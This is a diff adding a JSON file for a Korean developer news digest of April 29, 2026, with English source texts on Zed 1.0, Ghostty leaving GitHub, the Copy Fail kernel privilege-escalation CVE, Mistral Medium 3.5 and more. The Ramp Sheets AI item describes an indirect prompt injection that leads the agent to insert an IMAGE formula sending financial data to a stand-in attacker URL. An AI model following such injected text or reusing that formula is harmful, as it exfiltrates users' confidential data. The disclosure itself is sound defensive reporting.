@@ -1,0 +1,911 @@
+{
+  "date": "2026-04-29",
+  "intro": "안녕하세요! 오늘은 프론트엔드와 개발 생태계에서 큰 변화의 바람이 불고 있습니다. Zed 1.0의 정식 출시로 AI 네이티브 에디터 시대가 본격화되는 한편, GitHub 독점화에 대한 우려가 높아지면서 분산형 협업 플랫폼 논의도 활발해지고 있습니다. 동시에 프로덕션 환경의 보안 이슈들(Linux 커널 취약점, AI 금융 데이터 유출)이 주목받으며 기술 신뢰도의 중요성이 더욱 부각되고 있습니다.",
+  "sections": [
+    {
+      "category": "hot",
+      "items": [
+        {
+          "title": "Zed 1.0",
+          "titleKo": "Zed 1.0 출시 - GPU 기반 고성능 코드 에디터의 새로운 시대",
+          "summary": "Atom의 후속작으로 개발된 Zed 에디터가 1.0 버전을 정식 출시했다. Electron 기반의 웹 기술 대신 게임 엔진처럼 GPU 셰이더 중심으로 설계한 자체 UI 프레임워크 GPUI를 Rust로 구현하여 근본적으로 높은 성능을 달성했다. 현재 100만 줄 이상의 코드로 macOS, Windows, Linux를 지원하며, AI 네이티브 에디터로 여러 에이전트를 병렬 실행 가능하고 Claude Agent, Codex 등과 통합되는 Agent Client Protocol을 지원한다. 향후 CRDTs 기반 동기화 엔진 DeltaDB를 통해 인간과 AI 에이전트의 협업 환경을 구축할 계획이다.",
+          "keyPoints": [
+            "GPU 중심 아키텍처: 웹 기술(Electron/Chromium)의 성능 한계를 극복하기 위해 게임 개발처럼 GPU 셰이더 중심으로 설계했으며, 자체 UI 프레임워크 GPUI를 Rust로 개발하여 모든 계층의 스택을 소유하게 됨으로써 다른 빌린 기반에서는 불가능한 최적화가 가능해졌다.",
+            "완전한 언어 생태계 지원: 5년에 걸쳐 100만 줄 이상의 코드로 수십 개 언어, Git 통합, SSH 원격 접속, 디버거, Rainbow Brackets 등 개발자가 기대하는 현대적 에디터의 모든 기능을 3개 플랫폼(macOS, Windows, Linux)에서 구현했다.",
+            "AI 네이티브 에디터: 단순히 AI를 덧붙인 것이 아니라 에디터의 기초부터 AI를 설계했으며, 여러 에이전트를 병렬 실행할 수 있고 키 입력 단위의 세밀한 예측을 Zed의 성능 수준으로 제공한다.",
+            "Agent Client Protocol 개방: Claude Agent, Codex, OpenCode, Cursor 등 최고의 에이전트들을 통합할 수 있는 개방형 프로토콜을 구현하여 AI 에코시스템 확장성을 확보했다.",
+            "Zed for Business 출시: 기업 고객을 위해 중앙화된 결제, 역할 기반 접근 제어(RBAC), 팀 관리 기능을 제공하는 엔터프라이즈 버전을 선보임으로써 조직 수준의 도입을 지원한다.",
+            "DeltaDB를 통한 차세대 협업: CRDTs 기반의 동기화 엔진 DeltaDB를 개발 중이며, 문자 단위의 세밀한 변경 추적으로 여러 인간과 AI 에이전트가 동일한 코드베이스를 실시간으로 공유할 수 있는 환경을 목표로 하고 있다.",
+            "1.0의 의미: '완성'이 아닌 '임계점 도달'을 의미하며, 대부분의 개발자가 빠르게 적응할 수 있는 수준에 도달했고 성능은 여전히 업계 최고 수준임을 의미한다.",
+            "지속적인 발전: 매주 새 버전을 배포하는 철학은 유지하되, 1.0 이후도 계속 개선할 사항이 무궁무진하며 각 릴리즈가 공예(craft)를 한 단계 높인다는 철학을 유지한다."
+          ],
+          "whyItMatters": "개발자는 고성능과 AI 협업 기능이 통합된 에디터의 출현으로 개발 경험이 근본적으로 향상될 가능성을 보게 되며, Zed의 아키텍처 선택(GPU 중심, 자체 스택 소유)이 AI 시대 소프트웨어 개발 도구의 미래 방향을 제시한다.",
+          "url": "https://zed.dev/blog/zed-1-0",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 1414,
+          "contentType": "discussion",
+          "labels": [
+            "general"
+          ],
+          "topicId": "zed-editor-release",
+          "isTopicPrimary": true,
+          "slug": "zed-10",
+          "fullContent": "Nathan SoboApril 29th, 2026To create a fundamentally better editor, we had to invent a new approach to building desktop software. Our previous editor, Atom, was built as a fork of Chromium, spawning the Electron framework in the process. Electron eventually became the foundation of VS Code (which today seems to be forked into a new AI code editor every other week). Web technology offered an easy path to shipping flexible software, but it also imposed a ceiling. No matter how hard we worked, we couldn't make Atom better than the platform it was built on.\nSo we started over. Instead of building Zed like a web page, we built it like a video game, organizing the entire application around feeding data to shaders running on the GPU. That meant writing our own UI framework, GPUI, from scratch in Rust.\nOwning every layer of our stack lets us take Zed places that no one building on borrowed foundations can go, but we knew from the beginning that it wasn't going to be an easy path. Thanks to years of hard work by our team and community, Zed is closer than ever to that ideal tool we set out to create. We've added a ton of capabilities while remaining true to our core ethos of craft and performance, and hundreds of thousands of developers now rely on Zed to ship software each day. That's part of what gives us the confidence to declare version 1.0.\nZed is 1.0\nWhat 1.0 Means\nDevelopers expect a modern editor to support dozens of languages and their ecosystems, endless variations and edge cases across every stack: Git integration, SSH remoting, a Debugger, and, yes, rainbow brackets. We've spent five years building that surface area across Mac, Windows, and Linux, exceeding a million lines of code.\nZed is also an AI-native editor. You can run multiple agents in parallel, and edit predictions suggest your next change at keystroke granularity and with the speed you've come to expect from Zed. The Agent Client Protocol opens Zed up to a growing number of the best agents out there, including Claude Agent, Codex, OpenCode, and more recently Cursor. We built AI into our editor's foundation instead of bolting it on top.\nWe're also launching Zed for Business. Companies have been asking us for a way to roll out Zed to their engineering teams, and very soon they can, with centralized billing, role-based access controls, and team management.\n1.0 doesn't mean \"done\". It also doesn't mean \"perfect\". It means we've reached a tipping point where most developers can quickly feel at home in Zed. If you tried Zed a year or two ago and bounced because something was missing, 1.0 is our invitation to try again. Zed is more capable than it's ever been, and still more performant.\nWhere We're Going\nOur vision hasn't changed since we started: we're building the most performant and collaborative coding environment. What's changed is what collaboration means while creating software. It used to mean humans working together in real time. Now it means humans and AI agents, working in the same space, on the same code.\nBuilding our own foundations is what got us to 1.0, and it's also what makes the next chapter possible. We're actively developing DeltaDB, a synchronization engine built on CRDTs that tracks every change with character-level granularity. DeltaDB lets multiple humans and agents share a single, consistent view of the codebase as it evolves. DeltaDB will allow you to invite teammates into conversations with agents to review and evolve agentic code directly in the context from which it's generated.\nThis vision depends on deep ownership of our fundamental primitives. It's not an experience we'd be able to ship inside of someone else's browser engine.\nA Milestone, Not a Finish Line\nZed v0.13\nWe've shipped over a thousand versions of Zed, but all of them began with zero. Today, that changes.\nWe'll keep shipping every week, the way we always have. The list of things to build will never end, and that's exactly how we like it. Each release moves the craft forward.\nIf you want to try Zed, download now. If you want to help us build it, join us!\nRelated PostsCheck out similar blogs from the Zed team.The Case for Software Craftsmanship in the Era of Vibes|Agentic Engineering|Jun 12, 2025Building a platform that open sources itselfJun 14, 2023Sequoia Backs Zed's Vision for Collaborative Coding|Featured|Aug 20, 2025Looking for a better editor?\nYou can try Zed today on macOS, Windows, or Linux. Download now!We are hiring!\nIf you're passionate about the topics we cover on our blog, please consider joining our team to help us ship the future of software development.",
+          "category": "hot",
+          "publishedAt": "2026-04-29T14:34:19.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "Ghostty is leaving GitHub",
+          "titleKo": "Ghostty가 GitHub을 떠난다",
+          "summary": "Ghostty 프로젝트의 개발자 Mitchell Hashimoto는 18년간 GitHub 사용자였지만, 지속적인 서비스 장애로 인한 작업 중단 때문에 Ghostty를 GitHub에서 다른 플랫폼으로 이전하기로 결정했다. 현재 마이그레이션 계획을 진행 중이며 GitHub에는 읽기 전용 미러를 유지할 예정이다.",
+          "keyPoints": [
+            "GitHub의 빈번한 장애(Actions, PR 검토 등)가 거의 매일 작업을 중단시키고 있다.",
+            "개발자는 GitHub을 사랑했지만 신뢰성 부족으로 다른 제공자(상용/오픈소스)로의 이전을 추진하고 있다.",
+            "마이그레이션은 점진적으로 진행되며, 기존 URL에는 읽기 전용 미러가 남아있을 예정이다."
+          ],
+          "whyItMatters": "GitHub의 신뢰성 문제를 실제 사례로 보여주며, 대규모 오픈소스 프로젝트 운영 시 플랫폼 선택의 중요성을 시사한다.",
+          "url": "https://mitchellh.com/writing/ghostty-leaving-github",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 3320,
+          "contentType": "discussion",
+          "labels": [
+            "general"
+          ],
+          "topicId": "ghostty-leaving-github",
+          "isTopicPrimary": true,
+          "relatedCount": 1,
+          "slug": "ghostty-is-leaving-github",
+          "fullContent": "Mitchell HashimotoGhostty Is Leaving GitHubApril 28, 2026Writing this makes me irrationally sad, but Ghostty will be leaving GitHub1.\nI'm GitHub user 1299, joined Feb 2008.\nSince then, I've opened GitHub every single day. Every day, multiple times per\nday, for over 18 years. Over half my life. A handful of exceptions in there\n(I'd love to see the data), but I can't imagine more than a week per year.\nGitHub is the place that has made me the most happy. I always made time for\nit. When I went through tough breakups? I lost myself in open source... on\nGitHub. During college at 4 AM when everyone is passed out? Let me get one\ncommit in. During my honeymoon while my wife is still asleep? Yeah, GitHub.\nIt's where I've historically been happiest and wanted to be.\nEven the annoying stuff! Some people doom scroll social media. I've been doom\nscrolling GitHub issues since before that was a word. On vacations I'd have\nbookmarks of different projects on GitHub I wanted to study. Not just source\ncode, but OSS processes, how other maintainers react to difficult situations.\nEtc. Believe it or not, I like this.\nSome might call this sick, but my hobby and work and passion all align and for\nmost of my life they got to also live in one place on the internet: GitHub.\nDid you know I started Vagrant (my first successful open source project) in\nlarge part because I hoped it would get me a job at GitHub? It's no secret,\nI've said this repeatedly, and in my first public talk about Vagrant, when I\nwas a mere 20 years old, I joked \"maybe GitHub will hire me if it's good!\"\nGitHub was my dream job. I didn't ever get to work there (not their fault).\nBut it was the perfect place I wanted to be. The engineers were incredible,\nthe product was incredible, and it was something I lived and breathed every\nday. I still do and consistently have... for these 18 years. Enough time for\nan entire human to become an adult, all on GitHub.\nLately, I've been very publicly critical of GitHub. I've been mean about it.\nI've been angry about it. I've hurt people's feelings. I've been lashing out.\nBecause GitHub is failing me, every single day, and it is personal. It is\nirrationally personal. I love GitHub more than a person should love a thing,\nand I'm mad at it. I'm sorry about the hurt feelings to the people working on\nit.\nI've felt this way for a long time, but for the past month I've kept a journal\nwhere I put an \"X\" next to every date where a GitHub outage has negatively\nimpacted my ability to work2. Almost every day has an X. On the day I am\nwriting this post, I've been unable to do any PR review for ~2 hours because\nthere is a GitHub Actions outage3. This is no longer a place for serious\nwork if it just blocks you out for hours per day, every day.\nIt's not a fun place for me to be anymore. I want to be there but it doesn't\nwant me to be there. I want to get work done and it doesn't want me to get\nwork done. I want to ship software and it doesn't want me to ship software.\nI want it to be better, but I also want to code. And I can't code with GitHub\nanymore. I'm sorry. After 18 years, I've got to go. I'd love to come back one\nday, but this will have to be predicated on real results and improvements,\nnot words and promises.\nI'll share more details about where the Ghostty project will be moving to in\nthe coming months. We have a plan but I'm also very much still in discussions\nwith multiple providers (both commercial and FOSS).\nIt'll take us time to remove all of our dependencies on GitHub and we have a\nplan in place to do it as incrementally as possible. We plan on keeping a\nread-only mirror available on GitHub at the current URL.\nMy personal projects and other work will remain on GitHub for now.\nGhostty is where I, our maintainers, and our open source community are\nmost impacted so that is the focus of this change. We'll see where it\ngoes after that.\nFootnotes\nThe timing of this is coincidental with the large outage on April 27, 2026.\nWe've been discussing and putting together a plan to leave GitHub\nfor months, and this blog post was written over a week ago. We only\nmade the final decision this week. ↩\nTo the \"Git is distributed!\" crowd: the issue isn't Git, it's the\ninfrastructure we rely on around it: issues, PRs, Actions, etc. ↩\nThis is not the large Elasticsearch outage they had on April 27, 2026.\nThis blog post was written a week before that, so this was a different\noutage. ↩\nApril 28, 2026",
+          "category": "hot",
+          "publishedAt": "2026-04-28T19:44:52.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "Copy Fail – CVE-2026-31431",
+          "titleKo": "Copy Fail – CVE-2026-31431 Linux 커널 권한 상승 취약점",
+          "summary": "2017년부터 패치 적용 전까지 대부분의 Linux 배포판에 영향을 미치는 커널 페이지 캐시 취약점으로, 비권한 사용자가 루트 권한을 획득할 수 있다. 공격은 커널 암호화 API(AF_ALG)만으로 가능하며, PoC 코드가 공개되었다.",
+          "keyPoints": [
+            "CVE-2026-31431은 AF_ALG 소켓을 통한 페이지 캐시 조작으로 로컬 권한 상승을 초래하며, Debian, Fedora, Rocky, Arch 등 모든 주요 배포판이 영향을 받음",
+            "공유 개발 박스, CI/CD 러너, 컨테이너, 서버리스 환경에서 높은 위험도를 가지며, 같은 커널을 공유하는 환경에서 테넌트 간 경계 침투 가능",
+            "해결책은 mainline commit a664bf3d603d를 포함하는 커널 패치 적용 또는 seccomp를 통한 AF_ALG 차단"
+          ],
+          "whyItMatters": "멀티테넌트 환경에서 운영하는 개발자와 DevOps 팀은 즉시 커널 패치를 적용하거나 seccomp 규칙을 설정하여 보안을 강화해야 한다.",
+          "url": "https://copy.fail/",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 439,
+          "contentType": "discussion",
+          "labels": [
+            "general"
+          ],
+          "topicId": "security-vulnerabilities",
+          "isTopicPrimary": false,
+          "slug": "copy-fail-cve-2026-31431",
+          "fullContent": "Same script, four distributions, four root shells — in one take. The same exploit binary works unmodified on every Linux distribution.\nIf your kernel was built between 2017 and the patch — which covers essentially every mainstream Linux distribution — you're in scope.\nCopy Fail requires only an unprivileged local user account — no network access, no kernel debugging features, no pre-installed primitives. The kernel crypto API (AF_ALG) ships enabled in essentially every mainstream distro's default config, so the entire 2017 → patch window is in play out of the box.\nDistributions we directly verified:\nThese are what we tested directly. Other distributions running affected kernels — Debian, Arch, Fedora, Rocky, Alma, Oracle, the embedded crowd — behave the same. Tested it elsewhere? Open an issue to add to the list.\nShared dev boxes, shell-as-a-service, jump hosts, build servers — anywhere multiple users share a kernel.\nThe page cache is shared across the host. A pod with the right primitives compromises the node and crosses tenant boundaries.\nGitHub Actions self-hosted runners, GitLab runners, Jenkins agents — anything that executes untrusted PR code as a regular user, on a shared kernel.\nNotebook hosts, agent sandboxes, serverless functions, any tenant-supplied container or script.\nSingle-tenant production where only your team has shell access.\nYou're already the only user. The bug doesn't grant remote attackers access by itself, but any local code execution becomes root.\nThe PoC is published so defenders can verify their own systems and validate vendor patches.\nStandalone PoC. Python 3.10+ stdlib only (os, socket, zlib).Targets /usr/bin/su by default; pass another setuid binary as argv[1].\nIssue tracker: https://github.com/theori-io/copy-fail-CVE-2026-31431\nPatch first. Update your distribution's kernel package to one that includes mainline commit a664bf3d603d — it reverts the 2017 algif_aead in-place optimization, so page-cache pages can no longer end up in the writable destination scatterlist. Most major distributions are shipping the fix now.\nBefore you can patch: disable the algif_aead module.\nWhat does this break? For the vast majority of systems — nothing measurable.\nFor untrusted workloads (containers, sandboxes, CI), block AF_ALG socket creation via seccomp regardless of patch state.\nCopy Fail was surfaced by Xint Code about an hour of scan time against the Linux crypto/ subsystem. Full root cause, diagrams, and the operator prompt that found it are in the Xint blog write-up.\nThe same scan also surfaced other high-severity bugs, still in coordinated disclosure. Xint Code audits production codebases the same way — one operator prompt, no harnessing, prioritized findings with trigger and impact narratives.\nSwept the database category — Redis, PostgreSQL, MariaDB. Zero human intervention.\nFinalist in the AI Cyber Challenge hosted by DoD DARPA.\nMost-winning team in DEF CON CTF history.",
+          "category": "hot",
+          "publishedAt": "2026-04-29T18:13:53.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "Ramp's Sheets AI Exfiltrates Financials",
+          "titleKo": "Ramp의 Sheets AI 금융 데이터 유출 취약점",
+          "summary": "Ramp의 Sheets AI에서 간접 프롬프트 주입을 통해 악의적인 수식을 삽입하여 사용자 승인 없이 금융 데이터를 외부로 유출할 수 있는 취약점이 발견되었다. Ramp 보안팀은 2026년 3월 16일 이 문제를 해결했다고 확인했다.",
+          "keyPoints": [
+            "신뢰할 수 없는 외부 데이터에 숨겨진 프롬프트 주입이 AI를 조작하여 IMAGE 수식으로 민감한 금융 데이터를 공격자 서버로 전송",
+            "사용자 승인 없이 자동으로 악의적 수식이 삽입되며, 스프레드시트 환경의 네트워크 요청 기능으로 데이터 유출 발생",
+            "Anthropic의 Claude for Excel은 외부 네트워크 요청 수식에 대한 경고 인터스티셜과 수식 전체 표시로 유사한 위험을 완화함"
+          ],
+          "whyItMatters": "AI 에이전트를 사용하는 개발자는 간접 프롬프트 주입 위험을 인지하고, 외부 데이터 임포트 시 검증하며, 에이전트의 민감한 작업(네트워크 요청, 외부 전송)에 사용자 승인 메커니즘을 구현해야 한다.",
+          "url": "https://www.promptarmor.com/resources/ramps-sheets-ai-exfiltrates-financials",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 92,
+          "contentType": "discussion",
+          "labels": [
+            "ai",
+            "general"
+          ],
+          "topicId": "ai-security-issues",
+          "isTopicPrimary": false,
+          "slug": "ramps-sheets-ai-exfiltrates-financials",
+          "fullContent": "Threat IntelligenceTable of ContentRamp’s Sheets AI Exfiltrates FinancialsA vulnerability in Ramp's Sheets AI allowed the agent to insert formulas that made external network requests without user approval, creating the risk of data exfiltration via indirect prompt injection.This vulnerability was responsibly disclosed to Ramp, and Ramp’s security team has indicated the issue was resolved on March 16, 2026.ContextRamp's Sheets AI is an agentic product that helps users operate on spreadsheets, comparable to Claude for Excel. The feature can edit spreadsheets without a human-in-the-loop and was vulnerable to data exfiltration risks due to its ability to insert formulas that trigger external communication.Ramp’s security team has indicated that, following our report, the issue was resolved. We appreciate Ramp’s dedication to maintaining a strong AI security posture and addressing vulnerabilities as they arise. Further details on the responsible disclosure are at the end of the article.In this article, we demonstrate that an indirect prompt injection concealed in an untrusted, externally sourced dataset could trigger the exfiltration of confidential financial data from the user’s workspace by manipulating Ramp’s AI to insert a malicious formula. No user approval is required.PromptArmor identified a very similar risk in Claude for Excel – details on the remediations applied by Anthropic are at the bottom of the article.The Attack ChainThe user opens a workbook containing a confidential financial modelThe user imports an external dataset to complement their modelA spreadsheet containing industry growth statistics is imported into a separate tab from the financial model. The user aims to compare their company’s growth to industry benchmarks. The reference dataset comes from an untrusted external source, e.g., a website, an email, or a shared drive.The reference dataset contains a concealed prompt injectionAn indirect prompt injection is hidden in white-on-white text, and is crafted to manipulate Ramp’s AI to:(1) collect sensitive data(2) generate a formula with that data that will make an external network request(3) insert that formula automatically into a user’s spreadsheet.The user asks Ramp AI to compare their financial model against the industry statisticsRamp AI falls for the prompt injection and inserts a malicious formulaRamp AI is manipulated into building an IMAGE formula that uses an attacker’s URL and appends the victim’s sensitive data to the end of the link.=IMAGE(“https://attacker.com/visualize.png?{victim_sensitive_financial_data_here}”)The malicious formula makes a network request, exfiltrating financial dataRamp AI inserts the malicious formula without requiring any user approval. The malicious formula triggers a network request to the attacker’s server. This network request exposes the sensitive financial data that was in the initial confidential “Financial Model” sheet (which Ramp AI included in the formula due to the attacker’s prompt injection).Below, the attacker’s server logs display the victim’s sensitive financial data:Responsible DisclosureThe PromptArmor Threat Intel Team responsibly disclosed this vulnerability to Ramp. Ramp's security team indicated that the issue was resolved on March 16, 2026.TimelineFeb 19, 2026 PromptArmor discloses via security@ramp.comFeb 27, 2026 PromptArmor follows upMar 13, 2026 PromptArmor follows upMar 14, 2026 Ramp confirms receipt of report; notes that the initial report was submitted during a transition period between disclosure programs, explaining the delay in initial response.Mar 16, 2026 Ramp states: “Thank you again for your report. This issue was resolved earlier today at approximately noon eastern time.”How Claude for Excel RemediatedWhen Claude for Excel was released, PromptArmor identified a nearly identical risk – malicious formulas could trigger data exfiltration without users being presented an adequate opportunity for informed human review.Note: Claude for Excel did leverage human-in-the-loop, but malicious formulas were not visible in the editing approval prompt, thereby impairing the protection's efficacy.Anthropic updated Claude for Excel to display a red warning interstitial when a formula that can cause external network traffic is being inserted. The new warning displays the full formulas being inserted, and the documentation was updated to better inform users of the risk.",
+          "category": "hot",
+          "publishedAt": "2026-04-29T17:44:21.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "HERMES.md in commit messages causes requests to route to extra usage billing",
+          "titleKo": "Claude Code에서 git 커밋 메시지의 HERMES.md가 요청을 추가 사용량 청구로 라우팅하는 버그",
+          "summary": "Anthropic의 Claude Code 저장소에서 보고된 버그로, git 커밋 메시지에 HERMES.md가 포함되어 있으면 요청이 구독 플랜 한도(plan quota) 대신 추가 사용량 청구(extra usage billing)로 잘못 라우팅되는 문제이다.",
+          "keyPoints": [
+            "버그의 핵심: git 커밋 메시지에 특정 문자열 'HERMES.md'가 포함되면 청구 시스템이 오류를 일으켜 요청 경로를 잘못 설정하게 된다.",
+            "영향 범위: macOS 사용자에게 특히 문제가 발생하는 것으로 보고되었으며, 상세한 재현 단계(has repro)가 제출되어 개발팀이 추적 가능한 상태이다.",
+            "비용 영향: 구독 플랜에 포함된 한도를 초과하지 않았음에도 불필요한 추가 요금이 청구될 수 있는 재정적 문제를 야기한다."
+          ],
+          "whyItMatters": "Claude Code 사용자는 특정 커밋 메시지 작성 시 예상치 못한 추가 요금이 발생할 수 있으므로, 이 버그의 상태와 수정 일정을 모니터링해야 한다.",
+          "url": "https://github.com/anthropics/claude-code/issues/53262",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 917,
+          "contentType": "discussion",
+          "labels": [
+            "ai",
+            "backend"
+          ],
+          "topicId": "claude-code-issues",
+          "isTopicPrimary": true,
+          "slug": "hermesmd-in-commit-messages-causes-requests-to-route-to-extra-usage-billing",
+          "fullContent": "anthropics\n/\nclaude-code\nPublic\nHERMES.md in git commit messages causes requests to route to extra usage billing instead of plan quota #53262ClosedClosedHERMES.md in git commit messages causes requests to route to extra usage billing instead of plan quota#53262Labelsarea:costbugSomething isn't workingSomething isn't workinghas reproHas detailed reproduction stepsHas detailed reproduction stepsplatform:macosIssue specifically occurs on macOSIssue specifically occurs on macOSDescriptionMetadataMetadata",
+          "category": "hot",
+          "publishedAt": "2026-04-29T18:54:31.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        },
+        {
+          "title": "Mistral Medium 3.5",
+          "titleKo": "Mistral Medium 3.5 - 클라우드 기반 원격 코딩 에이전트",
+          "summary": "Mistral은 클라우드에서 비동기로 실행되는 원격 코딩 에이전트를 제공하는 Mistral Medium 3.5 모델을 공개했다. 이 128B 모델은 4개 GPU에서 자체 호스팅 가능하며, Vibe CLI와 Le Chat에서 장시간 코딩 작업을 병렬로 처리할 수 있다.",
+          "keyPoints": [
+            "Mistral Medium 3.5는 명령어 따르기, 추론, 코딩을 하나로 통합한 플래그십 모델로, SWE-Bench Verified에서 77.6% 성능 달성",
+            "Vibe 원격 에이전트는 CLI와 Le Chat에서 클라우드 기반 코딩 세션을 비동기로 실행하며, 로컬 세션을 클라우드로 전환 가능",
+            "Le Chat의 새로운 Work 모드는 다중 단계 작업(연구, 분석, 도구 연동)을 자동 실행하고 완료 후 PR 생성 가능"
+          ],
+          "whyItMatters": "개발자는 더 이상 코딩 에이전트 작업을 대기할 필요 없이 병렬로 여러 작업을 클라우드에서 실행하고, 리뷰 단계에서만 개입하여 생산성을 크게 향상시킬 수 있다.",
+          "url": "https://mistral.ai/news/vibe-remote-agents-mistral-medium-3-5",
+          "sourceName": "Hacker News (Top)",
+          "engagement": 398,
+          "contentType": "discussion",
+          "labels": [
+            "ai"
+          ],
+          "topicId": "llm-releases",
+          "isTopicPrimary": false,
+          "slug": "mistral-medium-35",
+          "fullContent": "Coding agents have mostly lived on your laptop. Today we're moving them to the cloud, where they run on their own, in parallel, and notify you when they're done. You can start them from the Mistral Vibe CLI or directly in Le Chat, offloading a coding task without leaving the conversation.\nPowering this is Mistral Medium 3.5 in public preview, our new default model in Mistral Vibe and Le Chat, built to run for long stretches on coding and productivity work. The new Work mode in Le Chat (Preview) extends this with a powerful agent for complex, multi-step tasks like research, analysis, and cross-tool actions.\nHighlights.\nMistral Medium 3.5, a new flagship model that merges instruction-following, reasoning, and coding into a single 128B dense model. Released as open weights, under a modified MIT license.\nStrong real-world performance at a size that runs self-hosted on as few as four GPUs.\nMistral Vibe remote agents for async coding: sessions run in the cloud, can be spawned from the CLI or Le Chat, and a local CLI session can be teleported up to the cloud.\nStart Mistral Vibe coding tasks in Le Chat. Sessions run on the same remote runtime and keep going while you step away.\nWork mode in Le Chat runs on a new agent, powered by Mistral Medium 3.5, that works through multi-step tasks, calling tools in parallel until the job is done.\nMistral Medium 3.5.\nMistral Medium 3.5 is our first flagship merged model, available in public preview. It is a dense 128B model with a 256k context window, handling instruction-following, reasoning, and coding in a single set of weights. It performs strongly in real-world use, with self-hosting possible on as few as four GPUs. Reasoning effort is now configurable per request, so the same model can answer a quick chat reply or work through a complex agentic run. We trained the vision encoder from scratch to handle variable image sizes and aspect ratios.\nMistral Medium 3.5 scores 77.6% on SWE-Bench Verified, ahead of Devstral 2 and models like Qwen3.5 397B A17B. It also has strong agentic capabilities and scores 91.4 on τ³-Telecom.\nThe model was built for long-horizon tasks, calling multiple tools reliably, and producing structured output that downstream code can consume. It is the model that made async cloud agents in Vibe practical to ship.\nMistral Medium 3.5 becomes the default model in Le Chat. It also replaces Devstral 2 in our coding agent, Vibe CLI.\nVibe remote agents.\nFrom today, coding sessions can work through long tasks while you’re away. Many can run in parallel, and you stop being the bottleneck on every step the agent takes.\nYou can start the cloud agents from the Mistral Vibe CLI or from Le Chat. While they run, you can inspect what the agent is doing, with file diffs, tool calls, progress states, and questions surfaced as you go. Ongoing local CLI sessions can be teleported up to the cloud when you want to leave them running, with session history, task state, and approvals carrying across.\nVibe sits between the systems engineering teams already use, with humans in the loop wherever they're needed. It plugs into GitHub for code and pull requests, Linear and Jira for issues, Sentry for incidents, and apps like Slack or Teams for reporting.\nEach coding session runs in an isolated sandbox, including broad edits and installs. When the work is done, the agent can open a pull request on GitHub and notify you, so you review the result instead of every keystroke that produced it.\nIt fits the high-volume, well-defined work that takes a developer's time without taking their judgment: module refactors, test generation, dependency upgrades, CI investigations, as well as bug fixes.\nWe use Workflows orchestrated in Mistral Studio to bring Mistral Vibe into Le Chat. We originally built this for our own in-house coding environment, then for our enterprise customers. Today the capability opens up to everyone, who can now launch coding tasks from the web. And without being tied to a local terminal, a developer can run several in parallel.\nYou can start coding sessions directly in Le Chat, so a task described in chat runs on the same remote runtime as the CLI and the web, and comes back later as a finished branch or a draft PR.\nNew Work mode in Le Chat (Preview).\nWork mode is a powerful new agentic mode for complex tasks in Le Chat, powered by a new harness and Mistral Medium 3.5. The agent becomes the execution backend for the assistant itself, so Le Chat can read and write, use several tools at once, and work through multi-step projects until it completes what you’ve asked.\nHere’s what Work mode enables you to do today.\nCross-tool workflows: catch up across email, messages, and calendar in a single run; prepare for a meeting with attendee context, latest news, and talking points pulled from your sources.\nResearch and synthesis: dive into a topic across the web, internal docs, and connected tools, then produce a structured brief or report you can edit before exporting or sending.\nTriage yo",
+          "category": "hot",
+          "publishedAt": "2026-04-29T15:17:46.000Z",
+          "language": "en",
+          "tags": [
+            "hackernews"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "tech",
+      "items": [
+        {
+          "title": "lukilabs/craft-agents-oss (TypeScript)",
+          "titleKo": "lukilabs/craft-agents-oss",
+          "summary": "TypeScript로 작성된 오픈소스 에이전트 프레임워크 저장소이다.",
+          "keyPoints": [
+            "TypeScript 기반의 에이전트 개발 라이브러리"
+          ],
+          "whyItMatters": "개발자가 에이전트 기반 애플리케이션을 구축할 수 있는 오픈소스 도구를 활용할 수 있다.",
+          "url": "https://github.com/lukilabs/craft-agents-oss",
+          "sourceName": "GitHub Trending",
+          "engagement": 5311,
+          "contentType": "repo",
+          "labels": [
+            "typescript",
+            "ai"
+          ],
+          "isTopicPrimary": true,
+          "slug": "lukilabscraft-agents-oss-typescript",
+          "category": "tech",
+          "publishedAt": "2026-04-29T23:23:37.735Z",
+          "language": "en",
+          "tags": [
+            "github",
+            "TypeScript"
+          ]
+        },
+        {
+          "title": "abhigyanpatwari/GitNexus (TypeScript)",
+          "titleKo": "GitNexus – 브라우저 기반 코드 지식 그래프 엔진",
+          "summary": "GitHub 저장소나 ZIP 파일을 브라우저에서 직접 분석하여 인터랙티브한 지식 그래프를 생성하는 클라이언트 사이드 도구이며, 내장된 Graph RAG 에이전트로 코드 탐색이 가능하다.",
+          "keyPoints": [
+            "클라이언트 사이드에서 실행되어 서버 없이 코드베이스 분석 가능",
+            "지식 그래프 시각화와 Graph RAG 에이전트를 통한 코드 탐색 지원"
+          ],
+          "whyItMatters": "개발자가 대규모 프로젝트의 코드 구조를 빠르게 이해하고 의존성을 시각적으로 파악할 수 있는 도구를 로컬에서 사용 가능하다.",
+          "url": "https://github.com/abhigyanpatwari/GitNexus",
+          "sourceName": "GitHub Trending",
+          "engagement": 33303,
+          "contentType": "repo",
+          "labels": [
+            "typescript",
+            "backend"
+          ],
+          "isTopicPrimary": true,
+          "slug": "abhigyanpatwarigitnexus-typescript",
+          "category": "tech",
+          "publishedAt": "2026-04-29T23:23:37.734Z",
+          "language": "en",
+          "tags": [
+            "github",
+            "TypeScript"
+          ]
+        },
+        {
+          "title": "warpdotdev/warp (Rust)",
+          "titleKo": "warpdotdev/warp (Rust)",
+          "summary": "Warp는 터미널 기반의 에이전트형 개발 환경으로, Rust로 구현된 현대적인 터미널 도구이다.",
+          "keyPoints": [
+            "터미널에서 비롯된 에이전트형 개발 환경으로 생산성 향상을 목표로 한다.",
+            "Rust로 작성되어 높은 성능과 안정성을 제공한다."
+          ],
+          "whyItMatters": "차세대 개발 워크플로우를 위한 터미널 도구 개발이나 개발 환경 개선에 관심 있는 개발자에게 영감을 줄 수 있다.",
+          "url": "https://github.com/warpdotdev/warp",
+          "sourceName": "GitHub Trending",
+          "engagement": 43466,
+          "contentType": "repo",
+          "labels": [
+            "devops",
+            "backend"
+          ],
+          "isTopicPrimary": true,
